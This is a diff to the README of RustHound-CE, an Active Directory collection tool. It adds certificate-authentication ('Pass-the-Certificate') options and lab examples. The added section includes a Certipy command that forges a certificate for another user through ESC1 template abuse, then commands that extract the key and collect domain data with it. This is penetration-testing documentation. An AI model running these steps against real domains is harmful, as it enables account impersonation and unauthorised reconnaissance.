@@ -12,6 +12,7 @@
   - [How to build documentation?](#how-to-build-documentation)
 - [Usage](#usage)
   - [Simple usage](#simple-usage)
+  - [Pass-the-Certificate](#pass-the-certificate-certificate-authentication)
   - [Using disk instead of memory](#using-disk-instead-of-memory)
   - [Module FQDN resolver](#module-fqdn-resolver)
 
@@ -223,9 +224,15 @@ OPTIONAL VALUES:
   -H, --hashes <hashes>              NT hash for pass-the-hash authentication (NTLM), accept [NTHASH, :NTHASH, LMHASH:NTHASH]
   -f, --ldapfqdn <ldapfqdn>          Domain Controller FQDN like: DC01.DOMAIN.LOCAL or just DC01
   -i, --ldapip <ldapip>              Domain Controller IP address like: 192.168.1.10
-  -P, --ldapport <ldapport>          LDAP port [default: 389]
+  -P, --ldapport <ldapport>          LDAP port [default: 389, or 636 with --ldaps]
   -n, --name-server <name-server>    Alternative IP address name server to use for DNS queries
   -o, --output <output>              Output directory where you would like to save JSON files [default: ./]
+
+CERTIFICATE AUTHENTICATION:
+      --pfx <pfx>            PFX/PKCS#12 client certificate for certificate authentication (Pass-the-Certificate). Uses StartTLS by default, or LDAPS with --ldaps
+      --pfx-pass <pfx-pass>  Password protecting the PFX file (optional)
+      --crt <crt>            PEM client certificate for certificate authentication (use with --key)
+      --key <key>            PEM private key for certificate authentication (use with --crt)
 
 OPTIONAL FLAGS:
   -c, --collectionmethod [<COLLECTIONMETHOD>]
@@ -286,6 +293,63 @@ export KRB5CCNAME="/tmp/jeor.mormont.ccache"
 rusthound-ce -d sevenkingdoms.local -f kingslanding -k -z
 # Kerberos authentication (Windows)
 rusthound-ce.exe -d sevenkingdoms.local -f kingslanding -k -z
+```
+
+## Pass-the-Certificate (certificate authentication)
+
+RustHound-CE can authenticate over LDAP with a client certificate instead of a
+password, NT hash, or Kerberos ticket. The Domain Controller maps the
+certificate to an account at the TLS layer (Schannel), so no bind credentials
+are needed. This is useful when PKINIT is not supported and works where LDAP
+Channel Binding is enforced.
+
+By default certificate auth uses **LDAP 389 + StartTLS**; add `--ldaps` to use
+**LDAPS 636** instead (some DCs only accept one of the two — try `--ldaps` if
+StartTLS is refused). The certificate must carry the target account's SID for
+strong certificate mapping (KB5014754). SMB-based modules (sessions and
+GPO/SYSVOL) are skipped in certificate mode, since no SMB credentials are
+available; LDAP collection runs fully.
+
+### Requesting a certificate with Certipy
+
+```bash
+# Request a certificate for a user you control (adjust CA and template; run `certipy find` first)
+certipy req -u user@essos.local -p 'password' -target braavos.essos.local -ca 'ESSOS-CA' -template User
+
+# Or forge one for another principal (ESC1); the UPN and SID must match the target
+certipy req -u attacker@essos.local -p 'password' -target braavos.essos.local -ca 'ESSOS-CA' \
+    -template User -upn daenerys.targaryen@essos.local -sid S-1-5-21-...-1112
+```
+
+### Converting the PFX to PEM (crt + key)
+
+RustHound-CE accepts a PFX directly (`--pfx` / `--pfx-pass`), but PEM is the most
+reliable path across Certipy versions. Extract the certificate and the key:
+
+```bash
+# With Certipy
+certipy cert -pfx daenerys.targaryen.pfx -nokey  -out daenerys.crt
+certipy cert -pfx daenerys.targaryen.pfx -nocert -out daenerys.key
+
+# Or with OpenSSL
+openssl pkcs12 -in daenerys.targaryen.pfx -nokeys  -out daenerys.crt -nodes
+openssl pkcs12 -in daenerys.targaryen.pfx -nocerts -out daenerys.key -nodes
+```
+
+### Usage
+
+```bash
+# Certificate auth over LDAPS (636), PEM cert + key
+rusthound-ce -d ESSOS.LOCAL -f MEEREEN.ESSOS.LOCAL --crt daenerys.crt --key daenerys.key -o /tmp/demo --ldaps -c All -z -v
+
+# Certificate auth over StartTLS (389, default when --ldaps is omitted)
+rusthound-ce -d ESSOS.LOCAL -f MEEREEN.ESSOS.LOCAL --crt daenerys.crt --key daenerys.key -o /tmp/demo -c All -z -v
+
+# Certificate auth with a PFX instead of PEM
+rusthound-ce -d ESSOS.LOCAL -f MEEREEN.ESSOS.LOCAL --pfx daenerys.targaryen.pfx --ldaps -o /tmp/demo -c All -z -v
+
+# PFX protected by a password
+rusthound-ce -d ESSOS.LOCAL -f MEEREEN.ESSOS.LOCAL --pfx daenerys.targaryen.pfx --pfx-pass 'P@ssw0rd' --ldaps -o /tmp/demo -c All -z
 ```
 
 ## Using disk instead of memory
